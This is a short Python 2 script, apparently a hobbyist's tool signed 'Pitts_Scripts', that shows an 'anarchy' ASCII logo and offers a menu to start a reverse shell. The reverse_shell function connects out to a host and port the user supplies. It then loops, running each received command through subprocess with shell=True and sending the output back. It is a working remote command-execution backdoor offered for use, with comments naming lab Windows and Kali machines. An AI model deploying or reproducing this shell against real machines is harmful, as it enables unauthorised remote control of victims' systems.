import socket
import subprocess

# windows machine 192.168.43.86
# kali boox 192.168.43.96

def logo():
    print ("""

       .        .      . ..,*,*///**,,**.*(/.....
       .     ,//*,. . .  .,,.******,*,,**.*//(*,.
     ,...  ,*/////(*,..  .....  ...,./**,,*/*/***
   ..     **///((#(###(*.. ...*(#%&%..,,,.,,**/*,
         ./,/(/(#((######%&&&&&&&&&&&,,*,*,.,****
  .      **,/((####%%%%%&&&&&&&&&&&&@@&,*/..,,,*(
         *,,//#%#%%%%%%&&&%&&&&@&&&@@@&(.(/**,,,,
   .     **,.((###%%#(#&&&&&&&&&&&&&&&, */,**,*
   .     ,**,*/((#%(/#%&&&&&&&&&&&&&&&&&/ .,*,***
   .    ..,, **,,(////%&&&&&&&&&%%&&&&&(, .././**
   .     .*.      *.(#%%&&&&&&&&(&&//#/..,*,**/
         ..          /#(%&%//,         (*  ,,,,*/
         ,      ,/(*   ,/%*.  ./#/,   .#*. ,**,,,
         .,.        ,*,*(((,       ..(..,***.**
         .,,.     **,,,,%&%%&&(*   .*(/(*,...*,/*
          ,.,/(///,*,,,,%&&&&&&%&%#%&%&, ,  .****
          . ..*/(*,,,.,*%&&&(%&&%%%%#* .. ,*,*.
           . .****...,(#%%&&%(%%&%%#%%,, ..,.,*,,
            .. ,..***,..,*##%%%&(##((%.    ,.,. ,
              ,  ***/##/#*%&&&%#(,.,(          . 
               .. ......   ......*#              
                  ...,. ...,,//*#.               
                   ,,*//(######                  
                    .,*(##%#(   
             "Introduce a little Anarchy"                                                                                                           
                  
                  - Pitts_Scripts  
    
    """)

def reverse_shell():
    print("What is the Host IP Address? i.e. 127.0.0.1")
    host = raw_input("> ")
    print("What is the Port? i.e. 443")
    port = input("> ")
    TEST = 'whoami'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect_ex((host, port))
        except socket.error:
            print("Could not connect to host.")
        CMD = subprocess.Popen(TEST, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(CMD.stdout.read())
        print("Connected!")
        while True:
            command = s.recv(1024)
            if 'exit' in command:
                s.close()
            else:
                CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(CMD.stdout.read())
                s.send(CMD.stderr.read())

def menu():

    logo()

    print ("""
    Do you want a reverse shell?
    1). Yes
    2). No""")

    while True:
        option = raw_input("> ")
        if option == "1":
            reverse_shell()
        elif option == "2":
            exit()

menu()
